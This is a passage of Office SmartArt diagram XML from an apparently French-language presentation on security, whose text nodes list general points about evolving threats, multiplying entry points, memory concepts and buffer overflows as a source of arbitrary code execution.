      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5A6DB6B5-AA4B-4C4B-845C-2BD2849F0F56}" type="sibTrans" cxnId="{2FB7AC02-1180-4492-B506-9D2CF7698870}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DA35AD39-FCD2-4F7D-9B04-53941A5C4A95}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Évolution constante des menaces.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4C6BB4F9-5C5C-41A5-9D46-76611AF7609F}" type="parTrans" cxnId="{F2C9B1F0-30D9-4104-AACA-7500CD2E8398}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7884B811-19AA-49F5-B5B3-2F293B83B96E}" type="sibTrans" cxnId="{F2C9B1F0-30D9-4104-AACA-7500CD2E8398}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{379E3187-6193-473C-9D87-D1EA18BF512E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Complexité croissante des systèmes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DED10EFA-2F09-4BD9-97EF-6E42459DBB61}" type="parTrans" cxnId="{2BF6CCF4-0FAD-4B95-82A7-F37AE58A9929}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D17C718F-F002-4B89-96F2-C0199F9FC21F}" type="sibTrans" cxnId="{2BF6CCF4-0FAD-4B95-82A7-F37AE58A9929}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A98DDE0C-030C-48CF-B2FE-48FF5FA75A87}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Multiplication des points d'entrée : IoT, cloud, edge computing.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5626EBCF-6288-4960-9B1B-FE4CB9B8A2B5}" type="parTrans" cxnId="{1EE812D1-C9CB-4E4D-B7A5-8DADA28FEDC6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{464E869E-6CF8-46E2-B724-91E0F14D6990}" type="sibTrans" cxnId="{1EE812D1-C9CB-4E4D-B7A5-8DADA28FEDC6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B8383AB3-F397-4D20-9154-FC94670A7D06}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Importance pour un professionnel en sécurité :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{88FAFEE1-F48A-446F-9794-2B7A38486053}" type="parTrans" cxnId="{4E74C692-CBC2-49C5-B1E8-DF91A4779683}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0A86AEDD-EE7F-464B-AB1C-71FEF2660F97}" type="sibTrans" cxnId="{4E74C692-CBC2-49C5-B1E8-DF91A4779683}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2E6DF21E-9487-4825-BDEE-352850CA6441}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Réagir rapidement aux nouvelles menaces.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D4C85C0A-47AC-4D34-82ED-C906B9D3C875}" type="parTrans" cxnId="{380B1F1D-4CD1-48D0-9772-055465E0C943}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F660D435-0E0B-4CF4-A9ED-571B98185B55}" type="sibTrans" cxnId="{380B1F1D-4CD1-48D0-9772-055465E0C943}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{34E0924D-8311-43F6-87BB-533EEEFDF3D3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Concevoir des contre-mesures robustes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1D4D073B-4FD4-4EB7-8980-3091B66C102F}" type="parTrans" cxnId="{747EA2C3-1597-439D-95A6-4719ECB0F6EA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{03736AC0-A26F-4E89-B608-9C9F600C325E}" type="sibTrans" cxnId="{747EA2C3-1597-439D-95A6-4719ECB0F6EA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{828EFCC2-AFDE-DB43-96BE-7921A6F39DDA}" type="pres">
      <dgm:prSet presAssocID="{924FFF7F-0534-496A-B5C2-94732AB61015}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A1529EA8-002D-6043-B540-780557BBC895}" type="pres">
      <dgm:prSet presAssocID="{CE58B470-90ED-47AC-8023-1421583D464C}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5914A51C-D22F-7445-B2C2-DB72EA1C98DE}" type="pres">
      <dgm:prSet presAssocID="{CE58B470-90ED-47AC-8023-1421583D464C}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{737D267C-E37E-FF42-B96A-054A8CC9530C}" type="pres">
      <dgm:prSet presAssocID="{CE58B470-90ED-47AC-8023-1421583D464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7A3A2F0-A1B5-D248-936B-5059FD11CBEA}" type="pres">
      <dgm:prSet presAssocID="{CE58B470-90ED-47AC-8023-1421583D464C}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{92B8BC95-03B0-A14A-A984-92B073B101B5}" type="pres">
      <dgm:prSet presAssocID="{CE58B470-90ED-47AC-8023-1421583D464C}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{684BFAD5-3E53-1B41-9F42-8FE6091F7E86}" type="pres">
      <dgm:prSet presAssocID="{5A6DB6B5-AA4B-4C4B-845C-2BD2849F0F56}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{2F9A68C3-BBF9-A247-8EE4-E1F76B3C3901}" type="pres">
      <dgm:prSet presAssocID="{B8383AB3-F397-4D20-9154-FC94670A7D06}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{120DDB2D-F0E5-2F47-B1B1-455AC8B04E6D}" type="pres">
      <dgm:prSet presAssocID="{B8383AB3-F397-4D20-9154-FC94670A7D06}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5A3EAAE5-E512-CD43-AEC9-54B854ABEF0E}" type="pres">
      <dgm:prSet presAssocID="{B8383AB3-F397-4D20-9154-FC94670A7D0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B530F19-CD10-1E4E-9431-F6F8A91EB618}" type="pres">
      <dgm:prSet presAssocID="{B8383AB3-F397-4D20-9154-FC94670A7D06}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EE2B4AC0-480D-3046-93BA-637EAAFE64A6}" type="pres">
      <dgm:prSet presAssocID="{B8383AB3-F397-4D20-9154-FC94670A7D0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FB7AC02-1180-4492-B506-9D2CF7698870}" srcId="{924FFF7F-0534-496A-B5C2-94732AB61015}" destId="{CE58B470-90ED-47AC-8023-1421583D464C}" srcOrd="0" destOrd="0" parTransId="{8BAFC4FA-41BC-438C-8AF9-5827F8FE2BB6}" sibTransId="{5A6DB6B5-AA4B-4C4B-845C-2BD2849F0F56}"/>
    <dgm:cxn modelId="{48FB7A1C-2A6B-4B46-8B9E-8455715CE54C}" type="presOf" srcId="{B8383AB3-F397-4D20-9154-FC94670A7D06}" destId="{5A3EAAE5-E512-CD43-AEC9-54B854ABEF0E}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{380B1F1D-4CD1-48D0-9772-055465E0C943}" srcId="{B8383AB3-F397-4D20-9154-FC94670A7D06}" destId="{2E6DF21E-9487-4825-BDEE-352850CA6441}" srcOrd="0" destOrd="0" parTransId="{D4C85C0A-47AC-4D34-82ED-C906B9D3C875}" sibTransId="{F660D435-0E0B-4CF4-A9ED-571B98185B55}"/>
    <dgm:cxn modelId="{6EA99B27-0097-3343-AAFC-A629EE96C777}" type="presOf" srcId="{B8383AB3-F397-4D20-9154-FC94670A7D06}" destId="{120DDB2D-F0E5-2F47-B1B1-455AC8B04E6D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{26DBC62C-4F95-7141-B4FC-ECFC8B456C39}" type="presOf" srcId="{CE58B470-90ED-47AC-8023-1421583D464C}" destId="{737D267C-E37E-FF42-B96A-054A8CC9530C}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0D95BE35-5E56-A64E-8890-00B2BACD395F}" type="presOf" srcId="{924FFF7F-0534-496A-B5C2-94732AB61015}" destId="{828EFCC2-AFDE-DB43-96BE-7921A6F39DDA}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{AABF2237-41C8-264A-85C9-8CF0FFE356C3}" type="presOf" srcId="{DA35AD39-FCD2-4F7D-9B04-53941A5C4A95}" destId="{92B8BC95-03B0-A14A-A984-92B073B101B5}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A97D4846-0DB3-7949-8C7E-DC4A0337B1DA}" type="presOf" srcId="{A98DDE0C-030C-48CF-B2FE-48FF5FA75A87}" destId="{92B8BC95-03B0-A14A-A984-92B073B101B5}" srcOrd="0" destOrd="2" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4C553B5D-1CA0-BA42-8FE9-948DFD1E5764}" type="presOf" srcId="{CE58B470-90ED-47AC-8023-1421583D464C}" destId="{5914A51C-D22F-7445-B2C2-DB72EA1C98DE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D4D4275F-8F76-EB44-B3FF-DE93573ED9D9}" type="presOf" srcId="{2E6DF21E-9487-4825-BDEE-352850CA6441}" destId="{EE2B4AC0-480D-3046-93BA-637EAAFE64A6}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4E74C692-CBC2-49C5-B1E8-DF91A4779683}" srcId="{924FFF7F-0534-496A-B5C2-94732AB61015}" destId="{B8383AB3-F397-4D20-9154-FC94670A7D06}" srcOrd="1" destOrd="0" parTransId="{88FAFEE1-F48A-446F-9794-2B7A38486053}" sibTransId="{0A86AEDD-EE7F-464B-AB1C-71FEF2660F97}"/>
    <dgm:cxn modelId="{747EA2C3-1597-439D-95A6-4719ECB0F6EA}" srcId="{B8383AB3-F397-4D20-9154-FC94670A7D06}" destId="{34E0924D-8311-43F6-87BB-533EEEFDF3D3}" srcOrd="1" destOrd="0" parTransId="{1D4D073B-4FD4-4EB7-8980-3091B66C102F}" sibTransId="{03736AC0-A26F-4E89-B608-9C9F600C325E}"/>
    <dgm:cxn modelId="{1EE812D1-C9CB-4E4D-B7A5-8DADA28FEDC6}" srcId="{CE58B470-90ED-47AC-8023-1421583D464C}" destId="{A98DDE0C-030C-48CF-B2FE-48FF5FA75A87}" srcOrd="2" destOrd="0" parTransId="{5626EBCF-6288-4960-9B1B-FE4CB9B8A2B5}" sibTransId="{464E869E-6CF8-46E2-B724-91E0F14D6990}"/>
    <dgm:cxn modelId="{6099F3D7-F60A-C143-AEEC-7AB1A6C979AA}" type="presOf" srcId="{34E0924D-8311-43F6-87BB-533EEEFDF3D3}" destId="{EE2B4AC0-480D-3046-93BA-637EAAFE64A6}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{334412E8-1053-6D47-8677-CA16B75E1617}" type="presOf" srcId="{379E3187-6193-473C-9D87-D1EA18BF512E}" destId="{92B8BC95-03B0-A14A-A984-92B073B101B5}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F2C9B1F0-30D9-4104-AACA-7500CD2E8398}" srcId="{CE58B470-90ED-47AC-8023-1421583D464C}" destId="{DA35AD39-FCD2-4F7D-9B04-53941A5C4A95}" srcOrd="0" destOrd="0" parTransId="{4C6BB4F9-5C5C-41A5-9D46-76611AF7609F}" sibTransId="{7884B811-19AA-49F5-B5B3-2F293B83B96E}"/>
    <dgm:cxn modelId="{2BF6CCF4-0FAD-4B95-82A7-F37AE58A9929}" srcId="{CE58B470-90ED-47AC-8023-1421583D464C}" destId="{379E3187-6193-473C-9D87-D1EA18BF512E}" srcOrd="1" destOrd="0" parTransId="{DED10EFA-2F09-4BD9-97EF-6E42459DBB61}" sibTransId="{D17C718F-F002-4B89-96F2-C0199F9FC21F}"/>
    <dgm:cxn modelId="{38D382CB-D141-5647-ADB1-D17EC0C32E47}" type="presParOf" srcId="{828EFCC2-AFDE-DB43-96BE-7921A6F39DDA}" destId="{A1529EA8-002D-6043-B540-780557BBC895}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{7EB49C1F-91EB-9D4B-B4A8-A28322D66C73}" type="presParOf" srcId="{A1529EA8-002D-6043-B540-780557BBC895}" destId="{5914A51C-D22F-7445-B2C2-DB72EA1C98DE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{84A52491-1CFF-FF42-9316-4A9E95830342}" type="presParOf" srcId="{A1529EA8-002D-6043-B540-780557BBC895}" destId="{737D267C-E37E-FF42-B96A-054A8CC9530C}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F0381746-91E7-7543-AFB2-7AA5AD1715EA}" type="presParOf" srcId="{828EFCC2-AFDE-DB43-96BE-7921A6F39DDA}" destId="{77A3A2F0-A1B5-D248-936B-5059FD11CBEA}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{02950B4A-3127-6141-ADF4-52D49B80A32F}" type="presParOf" srcId="{828EFCC2-AFDE-DB43-96BE-7921A6F39DDA}" destId="{92B8BC95-03B0-A14A-A984-92B073B101B5}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{174354F2-CF5A-C049-8170-BE8F75B40668}" type="presParOf" srcId="{828EFCC2-AFDE-DB43-96BE-7921A6F39DDA}" destId="{684BFAD5-3E53-1B41-9F42-8FE6091F7E86}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{5A3EA58F-0B71-964C-A750-153FC58E4A05}" type="presParOf" srcId="{828EFCC2-AFDE-DB43-96BE-7921A6F39DDA}" destId="{2F9A68C3-BBF9-A247-8EE4-E1F76B3C3901}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{337A6542-16F0-7F43-B1EE-07E09EE821C9}" type="presParOf" srcId="{2F9A68C3-BBF9-A247-8EE4-E1F76B3C3901}" destId="{120DDB2D-F0E5-2F47-B1B1-455AC8B04E6D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8842B8A7-4D48-F64E-B83B-CA885DEF82F4}" type="presParOf" srcId="{2F9A68C3-BBF9-A247-8EE4-E1F76B3C3901}" destId="{5A3EAAE5-E512-CD43-AEC9-54B854ABEF0E}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1F19B8ED-AE1C-ED47-8B23-714FF7C22E43}" type="presParOf" srcId="{828EFCC2-AFDE-DB43-96BE-7921A6F39DDA}" destId="{7B530F19-CD10-1E4E-9431-F6F8A91EB618}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B867565C-0CA9-5C4D-8604-2B851E0F495A}" type="presParOf" srcId="{828EFCC2-AFDE-DB43-96BE-7921A6F39DDA}" destId="{EE2B4AC0-480D-3046-93BA-637EAAFE64A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373DEB2-343A-400F-A1F1-5F050D0DB8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53B2E77-9892-490A-929A-278EA279C5D9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Lien avec la sécurité :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C02F521C-A1DA-41C5-8627-B12AC24A8B41}" type="parTrans" cxnId="{F63D1218-BCBF-4EA4-A465-A8F0520AEB78}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{029FE54A-FAF4-48C3-B816-A793CF68BEAE}" type="sibTrans" cxnId="{F63D1218-BCBF-4EA4-A465-A8F0520AEB78}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B70E5378-9B51-4FCC-A887-83E4AE191247}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Comprendre les concepts de mémoire (heap, stack).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7144274F-06FE-4DAA-98CB-01F7E7915445}" type="parTrans" cxnId="{D4E06FAD-2890-4D1A-A8CF-56C8E013BDEB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{77E07BC9-68B1-42EF-BE8C-0A22E22DB5A8}" type="sibTrans" cxnId="{D4E06FAD-2890-4D1A-A8CF-56C8E013BDEB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C03D3B43-F49B-4525-B801-F874A0278027}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Identifier facilement des vulnérabilités courantes comme le buffer overflow.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DDDBDBB9-B938-4FA5-9135-450A214E45DB}" type="parTrans" cxnId="{430475E9-1442-4575-B87A-7217F51D5304}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F300678D-BBDF-4FB7-83EB-6CB341B98775}" type="sibTrans" cxnId="{430475E9-1442-4575-B87A-7217F51D5304}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8F4BD338-B7DF-4D30-8EA4-37B184A43268}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Exemple concret :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3B36FF3F-F814-472C-A82E-516678FD63EF}" type="parTrans" cxnId="{F36D71BC-8791-49E4-B244-9B9EE863A525}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E422B26C-CBCC-4B57-9B82-06A846910116}" type="sibTrans" cxnId="{F36D71BC-8791-49E4-B244-9B9EE863A525}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{11BF463A-6480-4CA4-845F-94FB05BB0DD3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Une fonction mal conçue en C peut provoquer une exécution de code arbitraire.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C21AE542-E352-45F2-8397-2FA533D892F7}" type="parTrans" cxnId="{5C09DDD1-6EE0-47EE-8873-8A732DE5BAFD}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C7899A31-EBFB-4B16-AAC2-FA39F9B35928}" type="sibTrans" cxnId="{5C09DDD1-6EE0-47EE-8873-8A732DE5BAFD}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0B431276-5F87-4F41-A4C5-88D1CE2AEABD}" type="pres">
      <dgm:prSet presAssocID="{2373DEB2-343A-400F-A1F1-5F050D0DB8F5}" presName="root" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{AF6506C9-DF58-4F1D-8BF9-4A6D092045AE}" type="pres">
      <dgm:prSet presAssocID="{353B2E77-9892-490A-929A-278EA279C5D9}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CB60339C-53D5-4ECD-97B5-A0A37A37170B}" type="pres">
      <dgm:prSet presAssocID="{353B2E77-9892-490A-929A-278EA279C5D9}" presName="bgRect" presStyleLbl="bgShp" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{196EFA6F-14B7-41E2-A96A-9631D5859580}" type="pres">
      <dgm:prSet presAssocID="{353B2E77-9892-490A-929A-278EA279C5D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CACBD14-839D-4C7E-BFCC-0DDB5DF7200E}" type="pres">
      <dgm:prSet presAssocID="{353B2E77-9892-490A-929A-278EA279C5D9}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C5967B08-6BE5-4F9E-A09D-24A51F8068A9}" type="pres">
      <dgm:prSet presAssocID="{353B2E77-9892-490A-929A-278EA279C5D9}" presName="parTx" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{45D492A5-D45F-4288-8D42-60D114A93DCB}" type="pres">
      <dgm:prSet presAssocID="{353B2E77-9892-490A-929A-278EA279C5D9}" presName="desTx" presStyleLbl="revTx" presStyleIdx="1" presStyleCnt="4">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{87774703-3A45-43BF-B2DB-2784E983125F}" type="pres">
      <dgm:prSet presAssocID="{029FE54A-FAF4-48C3-B816-A793CF68BEAE}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DD69A333-A2F5-4071-B716-B969D7141090}" type="pres">
      <dgm:prSet presAssocID="{8F4BD338-B7DF-4D30-8EA4-37B184A43268}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D670D5F2-20FE-4F3C-93AA-273887601D70}" type="pres">
      <dgm:prSet presAssocID="{8F4BD338-B7DF-4D30-8EA4-37B184A43268}" presName="bgRect" presStyleLbl="bgShp" presStyleIdx="1" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
